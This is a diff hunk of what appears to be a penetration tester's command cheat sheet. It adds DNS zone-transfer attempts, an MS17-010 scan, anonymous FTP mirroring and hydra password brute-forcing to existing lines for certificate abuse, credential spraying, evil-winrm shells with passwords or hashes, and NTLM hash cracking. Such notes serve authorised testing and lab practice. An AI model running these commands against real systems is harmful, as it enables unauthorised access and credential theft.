@@ -51,12 +51,20 @@ certipy auth -dc-ip $DCIP -pfx administrator.pfx
 certipy auth -dc-ip $DCIP -pfx administrator.pfx -ldap-shell
 credspray.sh -t $IP -u findings.txt -c findings.txt
 uv run dementor.py -u $USER -p $PASSWORD -d $DOMAIN $LHOST $IP
+dig $DOMAIN A
+dig -x $IP
+dig axfr $DOMAIN @$IP
+dig $DOMAIN +trace
+nmap --script smb-vuln-ms17-010 -p445 $IP
 evil-winrm -i $IP -u $USER -p $PASSWORD
 evil-winrm -i $IP -u $USER -H $HASH
 evil-winrm -i $IP -u $USER -k
 evil-winrm -i $IP -c pub.pem -k priv.pem -S -r $DOMAIN
 ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 300 -fs 3142
 uv run FindUncommonShares.py --dc-ip $IP -u '$USER' -d '$DOMAIN' -p '$PASSWORD'
+wget -m ftp://anonymous:anonymous@$IP/
+ftp $IP
+hydra -l $USER -P /usr/share/wordlists/rockyou.txt ftp://$IP
 uv run gettgtpkinit.py $DOMAIN/$DC -cert-pfx crt.pfx -pfx-pass $PASSWORD out.ccache
 uv run gtfobinsuid.py
 hashcat -m 1000 hashes.ntlm2 /usr/share/wordlists/rockyou.txt --username
